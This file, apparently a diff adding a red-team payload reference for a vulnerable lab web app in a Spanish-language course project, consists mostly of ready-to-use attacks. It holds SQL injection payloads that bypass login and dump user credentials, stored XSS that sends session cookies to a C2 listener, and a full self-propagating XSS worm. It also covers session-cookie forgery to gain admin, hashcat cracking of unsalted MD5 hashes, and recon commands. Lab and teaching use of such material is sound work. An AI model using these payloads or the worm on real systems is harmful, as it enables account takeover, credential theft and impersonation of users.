@@ -1,0 +1,164 @@
+## Payloads de Referencia — VulnApp Red Team
+## Documento requerido por la Etapa 2 del proyecto
+## SOLO PARA USO EN LABORATORIO CONTROLADO
+
+================================================================================
+ ID-1: INYECCIÓN — SQL Injection (CWE-89)
+================================================================================
+
+── ENDPOINT: POST /api/login ───────────────────────────────────────────────────
+Query vulnerable en servidor:
+  SELECT id, username, role, email, password
+  FROM users
+  WHERE username = '<INPUT>'
+  AND   password = '<MD5_INPUT>'
+
+PAYLOAD 1 — Bypass de autenticación (OR clásico):
+  username = ' OR '1'='1'--
+  password = (cualquier valor)
+
+  Query resultante:
+    SELECT ... WHERE username = '' OR '1'='1'--' AND password = '...'
+  Efecto: La cláusula '1'='1' es SIEMPRE verdadera.
+          El comentario -- elimina la verificación de contraseña.
+  Resultado: Login como el primer usuario de la tabla.
+
+PAYLOAD 2 — UNION SELECT para enumerar columnas:
+  username = ' UNION SELECT 1,2,3,4,5--
+  Efecto: Confirma que la tabla users tiene 5 columnas.
+
+PAYLOAD 3 — UNION SELECT para exfiltrar credenciales:
+  username = ' UNION SELECT id,username,password,role,email FROM users LIMIT 1--
+  Efecto: Retorna el primer registro completo incluyendo hash MD5.
+
+── ENDPOINT: POST /api/search ──────────────────────────────────────────────────
+Query vulnerable:
+  SELECT id, username, email FROM users WHERE username LIKE '%<INPUT>%'
+
+PAYLOAD 4 — Enumerar esquema de la BD (sqlite_master):
+  query = ' UNION SELECT name,sql,'x' FROM sqlite_master WHERE type='table'--
+  Efecto: Lista todas las tablas y su definición SQL.
+
+PAYLOAD 5 — Exfiltración completa de la tabla users:
+  query = ' UNION SELECT username,password,email FROM users--
+  Efecto: Retorna todos los usuarios con sus hashes MD5.
+
+PAYLOAD 6 — Extraer solo admin:
+  query = ' UNION SELECT username,password,role FROM users WHERE role='admin'--
+
+── ENDPOINT: GET /api/users/:id ────────────────────────────────────────────────
+Query vulnerable:
+  SELECT id, username, role, email FROM users WHERE id = <ID>
+
+PAYLOAD 7 — UNION SELECT en parámetro de ruta:
+  URL: /api/users/0 UNION SELECT username,password,role,email FROM users WHERE role='admin'--
+  (URL-encoded: /api/users/0%20UNION%20SELECT%20username%2Cpassword%2Crole%2Cemail%20FROM%20users--')
+
+================================================================================
+ ID-1: INYECCIÓN — Stored XSS (CWE-79)
+================================================================================
+
+── ENDPOINT: POST /api/message ─────────────────────────────────────────────────
+Falla: El campo 'content' se inserta en la BD sin sanitización.
+Falla en frontend: innerHTML renderiza el contenido como HTML/JS (no texto).
+
+PAYLOAD 8 — XSS básico (prueba de concepto):
+  content = <script>alert('XSS')</script>
+  Efecto: Al abrir /api/messages, el navegador ejecuta el alert().
+
+PAYLOAD 9 — Exfiltración de cookie al C2:
+  content = <script>fetch('http://192.168.56.10:8888/?c='+document.cookie,{mode:'no-cors'})</script>
+  Efecto: La cookie de sesión de la víctima se envía al servidor C2 en Kali.
+
+PAYLOAD 10 — XSS Worm autorreplicante (completo):
+  content = <script>
+  (async function(){
+    // Exfiltrar cookie
+    fetch('http://192.168.56.10:8888/?c='+encodeURIComponent(document.cookie),{mode:'no-cors'});
+    // Buscar usuarios
+    const r = await fetch('/api/search',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({query:''}),credentials:'include'});
+    const d = await r.json();
+    // Propagarse a cada usuario
+    for(const u of (d.results||[])){
+      if(u.id) fetch('/api/message',{method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({receiverId:u.id,content:document.currentScript.outerHTML}),
+        credentials:'include'});
+    }
+  })();
+  </script>
+
+  Entrega: POST con Content-Type: application/json al req.body.content
+  Instalación: Se persiste en la tabla 'messages' de SQLite.db
+  C2: fetch() envía beacons al listener Python en puerto 8888.
+
+================================================================================
+ ID-2: FALLAS CRIPTOGRÁFICAS — Cookie Base64 sin HMAC (CWE-345/311)
+================================================================================
+
+PASO 1 — Cookie legítima recibida tras login:
+  Set-Cookie: session=eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9; Path=/
+
+PASO 2 — Decodificar Base64 (CyberChef: From Base64):
+  eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9
+  → {"userId":2,"username":"alice","role":"user"}
+
+PASO 3 — Manipular JSON (CyberChef: editar campo):
+  Cambiar: "role":"user"
+  Por    : "role":"admin"
+  JSON adulterado: {"userId":2,"username":"alice","role":"admin"}
+
+PASO 4 — Re-codificar en Base64 (CyberChef: To Base64):
+  eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ==
+
+PASO 5 — Inyectar cookie en cabecera HTTP (Burp Suite / curl):
+  curl http://192.168.56.20:4000/api/profile \
+       -H "Cookie: session=eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ=="
+
+  Efecto: El servidor confía en role=admin → expone toda la BD.
+
+================================================================================
+ ID-2: FALLAS CRIPTOGRÁFICAS — MD5 sin salt (CWE-327/759/916)
+================================================================================
+
+Hashes MD5 extraídos de la BD (sin salt):
+  admin    → 0192023a7bbd73250516f069df18b500  (admin123)
+  alice    → 7c6a180b36896a0a8c02787eeafb0e4c  (password1)
+  bob      → d8578edf8458ce06fbc5bb76a58c5ca4  (qwerty)
+  carlos   → b0be8b15a4d3b7f94dc3dca5d7c9e46f  (carlos2024)
+
+Comando Hashcat en Kali Linux:
+  hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+  -m 0  : Modo MD5
+  -a 0  : Ataque por diccionario
+  Sin salt → determinista → rainbow tables funcionan directamente.
+
+================================================================================
+ FASE I: RECONOCIMIENTO — Comando ffuf
+================================================================================
+
+En Kali Linux (alternativa al script Python):
+  ffuf -u http://192.168.56.20:4000/FUZZ \
+       -w /usr/share/wordlists/dirb/common.txt \
+       -mc 200,401,403,405 \
+       -t 10
+
+Descubrimiento manual de cabeceras:
+  curl -v http://192.168.56.20:4000/api/login 2>&1 | grep -E "X-Powered-By|Set-Cookie"
+  → X-Powered-By: Express (revela tecnología)
+  → Set-Cookie: session=<BASE64> (revela mecanismo de sesión vulnerable)
+
+================================================================================
+ FASE VI: C2 — Servidor de escucha Python
+================================================================================
+
+En Kali Linux (antes de ejecutar el Worm XSS):
+  python3 red-team/04_xss_worm_payload.py --solo-listener
+  # O manualmente:
+  python3 -m http.server 8888
+
+Beacon recibido cuando la víctima abre sus mensajes:
+  GET /?c=session%3DeyJ1c2VySWQi...&u=http%3A%2F%2F192.168.56.20%3A4000%2F
+  → Cookie de sesión de la víctima: session=eyJ1c2VySWQi...
+  → Decodificar y usar para suplantación de identidad.
